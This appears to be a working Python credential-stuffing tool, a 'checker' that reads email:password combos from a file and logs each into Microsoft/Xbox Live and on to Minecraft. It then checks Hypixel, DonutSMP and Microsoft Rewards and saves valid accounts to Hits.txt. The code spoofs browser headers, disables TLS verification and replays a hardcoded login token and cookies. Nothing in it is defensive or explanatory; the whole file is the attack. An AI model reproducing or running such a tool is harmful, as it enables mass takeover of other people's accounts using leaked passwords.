import time
import json
import uuid
import re
import urllib.parse
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import os
from datetime import datetime

from checkers import donut_checker, minecraft, hypixel_checker, rewardpoints

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_optimized_session():
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=Retry(total=0))
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    return session

RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
RE_URLPOST_VALUE = re.compile(r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"', re.S)

def get_urlPost_sFTTag(session):
    sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
    for _ in range(3):
        try:
            text = session.get(sFTTag_url, timeout=10).text
            match = RE_SFTTAG_VALUE.search(text)
            if match:
                sFTTag = next((g for g in match.groups() if g is not None), None)
                if sFTTag:
                    match_url = RE_URLPOST_VALUE.search(text)
                    if match_url:
                        urlPost = next((g for g in match_url.groups() if g is not None), None)
                        if urlPost:
                            urlPost = urlPost.replace('&amp;', '&')
                            return (urlPost, sFTTag, session)
        except Exception:
            pass
        time.sleep(0.5)
    return ("ERROR", None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    for _ in range(3):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=10)
            if '#' in login_request.url:
                token = urllib.parse.parse_qs(urllib.parse.urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif 'cancel?mkt=' in login_request.text:
                ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text).group()
                pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text).group()
                uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text).group()
                data2 = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                action_url = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text).group()
                ret = session.post(action_url, data=data2, allow_redirects=True, timeout=10)
                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                fin = session.get(return_url, allow_redirects=True, timeout=10)
                token = urllib.parse.parse_qs(urllib.parse.urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif any(k in login_request.text.lower() for k in ['password is incorrect', "account doesn't exist"]):
                return ('None', session)
        except Exception:
            pass
        time.sleep(0.5)
    return ('ERROR', session)

def _ms_login(email, password, session):
    rps_result = get_urlPost_sFTTag(session)
    if rps_result and rps_result[0] != "ERROR" and rps_result[1]:
        rps_url, rps_sft, auth_session = rps_result
        rps_token_result = get_xbox_rps(auth_session, email, password, rps_url, rps_sft)
        if rps_token_result:
            rps_tok, _ = rps_token_result
            if rps_tok and rps_tok not in ("None", "2FA", "ERROR"):
                return rps_tok
            elif rps_tok == "2FA":
                return "2FA"
            elif rps_tok == "None":
                return "None"
    url = "https://login.live.com/ppsecure/post.srf?username=%7bemail%7d&client_id=0000000048170EF2&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216&prompt=none"
    ppft = ("-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$")
    cookie = ("MSPRequ=id=N&lt=1765024327&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKxVoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNUNe1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7KKArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEBdWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3HKxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$")
    try:
        r = session.post(url.replace("%7bemail%7d", urllib.parse.quote(email)),
                         data={"login": email, "loginfmt": email, "passwd": password, "PPFT": ppft},
                         headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": cookie},
                         timeout=15, allow_redirects=False)
        if r.status_code == 302 and "access_token=" in r.headers.get("Location", ""):
            loc = r.headers["Location"]
            token = urllib.parse.unquote(loc.split("access_token=")[1].split("&")[0])
            if token and token != "None":
                return token
    except Exception:
        pass
    return "ERROR"

def mc_token(session, uhs, xsts_token):
    for _ in range(3):
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                    json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'},
                                    headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 200:
                return mc_login.json().get('access_token')
        except Exception:
            pass
        time.sleep(0.5)
    return None

def authenticate(email, password, max_retries=3):
    for attempt in range(max_retries):
        session = create_optimized_session()
        try:
            rps_token = _ms_login(email, password, session)
            if rps_token == '2FA':
                return '2FA'
            if rps_token in (None, 'None', 'ERROR'):
                return False
            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                      json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token},
                                            'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'},
                                      headers={'Content-Type': 'application/json'}, timeout=10)
            xbox_data = xbox_login.json()
            xbox_token = xbox_data.get('Token')
            if not xbox_token:
                return False
            uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']
            xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]},
                                      'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'},
                                headers={'Content-Type': 'application/json'}, timeout=10)
            xsts_data = xsts.json()
            xsts_token = xsts_data.get('Token')
            if not xsts_token:
                return False
            minecraft_token = mc_token(session, uhs, xsts_token)
            return (xbox_token, minecraft_token, session)
        except Exception:
            pass
        finally:
            if 'session' in locals():
                session.close()
        time.sleep(1)
    return False

def save_result(results_dir, filename, content):
    os.makedirs(results_dir, exist_ok=True)
    with open(os.path.join(results_dir, filename), 'a', encoding='utf-8') as f:
        f.write(content + '\n')

def check_account(email, password, results_dir):
    print(f"\nChecking: {email}")
    auth_result = authenticate(email, password)
    if auth_result == '2FA':
        save_result(results_dir, '2FA.txt', f'{email}:{password}')
        print(f"  [2FA] Two-factor authentication required")
        return
    if auth_result is False:
        save_result(results_dir, 'Invalid.txt', f'{email}:{password}')
        print(f"  [INVALID] Wrong credentials")
        return
    xbox_token, minecraft_token, session = auth_result
    print(f"  [LOGIN] Successfully authenticated")
    profile_data = minecraft.get_profile(session, minecraft_token)
    if not profile_data:
        save_result(results_dir, 'NoMinecraft.txt', f'{email}:{password}')
        print(f"  [NOMC] No Minecraft profile")
        rewardpoints.check_rewards(session, email, password, results_dir)
        return
    username = profile_data.get('name', 'N/A')
    uuid_val = profile_data.get('id', 'N/A')
    print(f"  [PROFILE] Username: {username}, UUID: {uuid_val}")
    hypixel_checker.get_stats(username, results_dir, email, password)
    donut_checker.check_access(uuid_val, results_dir, email, password, session)
    rewardpoints.check_rewards(session, email, password, results_dir)
    save_result(results_dir, 'Hits.txt', f'{email}:{password} | {username}')

def main():
    combos_file = 'acc.txt'
    if not os.path.exists(combos_file):
        print("acc.txt not found")
        return
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    results_dir = os.path.join('results', timestamp)
    os.makedirs(results_dir, exist_ok=True)
    with open(combos_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and ':' in line]
    print(f"Loaded {len(lines)} accounts")
    for line in lines:
        email, password = line.split(':', 1)
        check_account(email, password, results_dir)
    print(f"\nResults saved to {results_dir}")

if __name__ == '__main__':
    main()
